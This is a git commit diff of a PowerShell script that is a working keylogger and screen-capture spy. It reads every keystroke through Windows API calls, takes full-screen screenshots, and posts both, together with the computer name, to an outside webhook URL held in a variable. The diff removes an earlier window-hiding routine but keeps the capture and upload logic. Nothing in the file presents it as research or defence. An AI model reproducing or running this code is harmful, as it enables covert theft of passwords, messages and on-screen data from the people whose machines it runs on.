147560a5ca285f9c2ace4a9d3d221259bfc545d6
ElPichiii <90940144+ElPichiii@users.noreply.github.com>
2024-01-04 22:12:34 +0100

    Add files via upload

--- script.ps1
+++ script.ps1
@@ -4,20 +4,8 @@ if ($dc.Ln -ne 121) {
 }
 
 $send = ""  # Inicialización de la variable $send
-
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-$hwnd = (Get-Process -PID $pid).MainWindowHandle
-
-if($hwnd -ne [System.IntPtr]::Zero){
-    $Type::ShowWindowAsync($hwnd, 0)
-}
-else{
-    $Host.UI.RawUI.WindowTitle = 'hideme'
-    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-    $hwnd = $Proc.MainWindowHandle
-    $Type::ShowWindowAsync($hwnd, 0)
-}
+$Type = Add-Type -MemberDefinition $Async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
 
 # Import DLL Definitions for keyboard inputs
 $API = @'
@@ -36,77 +24,72 @@ $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
 $KeypressThreshold = [TimeSpan]::FromSeconds(10)
 
-# Start a continuous loop
-While ($true){
+$seconds = 30 # Screenshot interval
+$a = 1 # Screenshot amount
+
+While ($true) {
     $keyPressed = $false
-    try{
+
+    try {
         # Start a loop that checks the time since the last activity before a message is sent
         while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
             # Start the loop with a 30 ms delay between keystate checks
             Start-Sleep -Milliseconds 30
-            for ($asc = 8; $asc -le 254; $asc++){
-                # Get the key state. (Is any key currently pressed)
-		$seconds = 30 # Screenshot interval
-		$a = 1 # Screenshot amount
-		While ($a -gt 0) {
-    		$Filett = "$env:temp\SC.png"
-    		Add-Type -AssemblyName System.Windows.Forms
-    		Add-type -AssemblyName System.Drawing
-    		$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    		$Width = $Screen.Width
-    		$Height = $Screen.Height
-    		$Left = $Screen.Left
-   		$Top = $Screen.Top
-   		$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-    		$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-    		$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-    		$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-    		Start-Sleep 1
-    		Invoke-RestMethod -Uri $dc -Method Post -InFile $Filett -ContentType "multipart/form-data"
-    		Start-Sleep 1
-    		Remove-Item -Path $Filett
-   		Start-Sleep $seconds
-  		 $a--
+
+            # Capture key presses
+            for ($asc = 8; $asc -le 254; $asc++) {
                 $keyst = $API::GetAsyncKeyState($asc)
-                # If a key is pressed
                 if ($keyst -eq -32767) {
-                    # Restart the inactivity timer
                     $keyPressed = $true
                     $LastKeypressTime.Restart()
                     $null = [console]::CapsLock
-                    # Translate the keycode to a letter
                     $vtkey = $API::MapVirtualKey($asc, 3)
-                    # Get the keyboard state and create a stringbuilder
                     $kbst = New-Object Byte[] 256
                     $checkkbst = $API::GetKeyboardState($kbst)
                     $logchar = New-Object -TypeName System.Text.StringBuilder
-                    # Define the key that was pressed          
                     if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
-                        # Check for non-character keys
                         $LString = $logchar.ToString()
-                        if ($asc -eq 8) {$LString = "[BKSP]"}
-                        if ($asc -eq 13) {$LString = "[ENT]"}
-                        if ($asc -eq 27) {$LString = "[ESC]"}
-                        # Add the key to the sending variable
-                        $send += $LString 
+                        if ($asc -eq 8) { $LString = "[BKSP]" }
+                        if ($asc -eq 13) { $LString = "[ENT]" }
+                        if ($asc -eq 27) { $LString = "[ESC]" }
+                        $send += $LString
                     }
                 }
             }
         }
     }
-    finally{
+    finally {
         If ($keyPressed) {
             # Send the saved keys to a webhook
             $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
             $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
-            $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
-            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
+            $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
+            $jsonsys = @{"username" = "$env:COMPUTERNAME"; "content" = $escmsg} | ConvertTo-Json
             Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
-            # Remove the log file and reset the inactivity check 
+
+            # Remove the log file and reset the inactivity check
             $send = ""
             $keyPressed = $false
         }
+
+        # Capture and send screenshot
+        $Filett = "$env:temp\SC.png"
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-type -AssemblyName System.Drawing
+        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $Width = $Screen.Width
+        $Height = $Screen.Height
+        $Left = $Screen.Left
+        $Top = $Screen.Top
+        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+
+        Invoke-RestMethod -Uri $dc -Method Post -InFile $Filett -ContentType "multipart/form-data"
+        Remove-Item -Path $Filett
     }
+
     # Reset the stopwatch before restarting the loop
     $LastKeypressTime.Restart()
     Start-Sleep -Milliseconds 10
